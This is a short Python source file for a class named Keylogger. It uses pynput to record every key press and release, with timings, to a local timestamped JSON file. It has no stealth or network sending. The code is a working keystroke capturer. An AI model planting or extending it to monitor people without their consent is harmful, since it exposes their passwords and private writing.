import time
import json
from pynput import keyboard
import datetime


class Keylogger:
    #constructor
    def __init__(self):
        self.counter = 0
        self.start_time = time.time()
        self.start_time_2 = datetime.datetime.now()
        
        pass

    #method
    def start_recording(self):
        with keyboard.Listener(on_press = self.on_press, on_release=self.on_release) as listener:
            listener.join()
        pass
    
    def on_press(self, key):
        elapsed_time = time.time()-self.start_time
    
        event ={
            "timestamp":elapsed_time,
            "key":str(key),
            "status":"down"
        }

        try:
            with open("{a}.json".format(a=self.start_time_2.strftime("%Y-%m-%d_%H:%M:%S")), "r") as file:
                existing_data = json.load(file)
        except:
            existing_data = {
                "keypresses":[]
            }

        existing_data['keypresses'].append(event)

        with open("{a}.json".format(a=self.start_time_2.strftime("%Y-%m-%d_%H:%M:%S")), 'w') as file:
            json.dump(existing_data, file)
            
    def on_release(self, key):
        elapsed_time = time.time()-self.start_time

        event ={
            "timestamp":elapsed_time,
            "key":str(key),
            "status":"up"
        }

        try:
            with open("{a}.json".format(a=self.start_time_2.strftime("%Y-%m-%d_%H:%M:%S")), "r") as file:
                existing_data = json.load(file)
        except:
            existing_data = {
                "keypresses":[]
            }

        existing_data['keypresses'].append(event)

        with open("{a}.json".format(a=self.start_time_2.strftime("%Y-%m-%d_%H:%M:%S")), 'w') as file:
            json.dump(existing_data, file)
        
    def save_recording(self):
        with open("{a}.json".format(a=self.start_time_2.strftime("%Y-%m-%d_%H:%M:%S")), "r") as file:existing_data = json.load(file)
        pass 